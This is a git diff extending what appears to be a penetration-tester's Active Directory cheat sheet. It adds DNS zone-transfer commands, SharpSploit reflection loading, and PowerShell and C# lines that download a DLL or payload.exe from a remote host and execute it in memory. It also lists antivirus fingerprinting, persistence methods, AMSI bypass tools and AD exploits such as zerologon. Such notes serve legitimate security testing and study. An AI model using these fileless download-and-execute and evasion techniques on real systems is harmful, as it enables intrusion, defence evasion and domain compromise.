@@ -22,17 +22,22 @@ rpcclient -U "" -N "IP" 		(Null session)
 - querydispinfo
 > Can also do password spraying through it
 
-## dig:
-
 ## ldapdomaindump:
 - Dumps domain info using LDAP
 ```bash
 ldapdomaindump -u '"DOMAIN"\"USERNAME"' -p "PASSWORD" "IP ADDRESS" -o "OUTPUT DIRECTORY"
 ```
 
-## Zone Transfers:
+## DNS Issues:
+- Zone Transfers
 ```bash
 dig axfr @"IP ADDRESS" "DOMAIN NAME"
+```
+- Information Leaking
+```
+dig @"IP ADDRESS" "DOMAIN NAME"
+dig any @"IP ADDRESS" "DOMAIN NAME"
+dig all @"IP ADDRESS" "DOMAIN NAME"
 ```
 
 ## nslookup (Can give DNS records):
@@ -329,11 +334,62 @@ Seatbelt.exe -group=all -full
 ```
 
 ## SharpSploit:
-- 
+- Has a lot of tools we can use through DLL
+- To import the DLL in a binary we can use the following methods
+- Powershell Method using DLL on target:
+```cs
+[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes("SharpSploit.dll").GetType("SharpSploit.Execution.Shell").GetMethod("ShellExecute").Invoke(0, @("whoami", "", "", ""))
+```
+- Powershell Method using remote DLL:
+```cs
+[System.Reflection.Assembly]::Load((new-object net.webclient).DownloadData("https://example.com/SharpSploit.dll").GetType("SharpSploit.Execution.Shell").GetMethod("ShellExecute").Invoke(0, @("whoami", "", "", ""))
+```
+- C# Method using remote DLL:
+```cs
+public class Program {
+    public static void Main() {
+        System.Reflection.Assembly.Load(new System.Net.WebClient().DownloadData("https://example.com/SharpSploit.dll")).GetType("SharpSploit.Execution.Shell").GetMethod("ShellExecute").Invoke(0, @("whoami", "", "", ""));
+    }
+}
+```
+- We can use this as reference code but we will need to have the `SharpSploit.dll` on the target as well, unless we use `ILMerge` or `Costura` to merge the binary and the DLL
+```cs
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using SharpSploit;
+
+
+namespace SharpSploitWhoAmI
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            SharpSploit.Credentials.Tokens tokens = new SharpSploit.Credentials.Tokens();
+            string whoami = tokens.WhoAmI();
+            Console.WriteLine(whoami);
+            
+        }
+    }
+}
+```
+- In `Costura` method, Write the code first then on the Reference section in Visual Studio add reference of the `SharpSploit.dll` and then compile
+- We can also use `SharpGen` to generate a binary
+
+## Reflection Method from URL:
+- Can use this to load a payload from url using reflection method without touching disk
+- Need to defeat AMSI before
+```c
+$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/payload.exe')
+$assem = [System.Reflection.Assembly]::Load($data)
+[TotallyNotMal.Program]::Main()
+```
 
 ## WinPEAS:
-- 
-
+- Enumerate privelege escalation methods
+- Can be obfuscated in `Visual Studio` using `dotfuscator`
 
 ## DACLs/ACLs:
 `acl-pwn`
@@ -359,3 +415,45 @@ secretsdump.py "DOMAIN"/"USERNAME":"PASSWORD"@"IP ADDRESS"
 ```bash
 hashcat -m 1000 hashes ~/Desktop/rockyou.txt -r InsidePro-PasswordsPro.rule
 ```
+
+## Fingerprinting Antivirus:
+```bash
+wmic.exe /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get *
+```
+
+## Persistence Mechanisms:
+- C2
+- COM Persistence
+- DLL Hijacked Persistence
+- DLL Side Loading
+- Task Scheduler
+- Registry Keys
+- Startup Folder
+- `SharpPersist`
+- `Fake-AMSI-Provider`
+
+## Initial Access:
+- VBA Stomping/Purging
+
+## AMSI Bypass
+- `amsi.fail`
+- `https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell`
+- `https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/`
+- `https://s3cur3th1ssh1t.github.io/A-tale-of-EDR-bypass-methods/`
+- AMS-BP
+- `SharpUnhooker`
+- `SysCallAMSIScanBufferBypass`
+- AMSI Trigger
+- PS-AMSI
+- ThreatCheck
+- DefenderCheck
+
+## Some AD Attacks:
+- kerbrelayup
+- zerologon
+- printnightmare
+
+## Automation
+- `WinPWN`
+- `autoenum`
+- `threader3000`
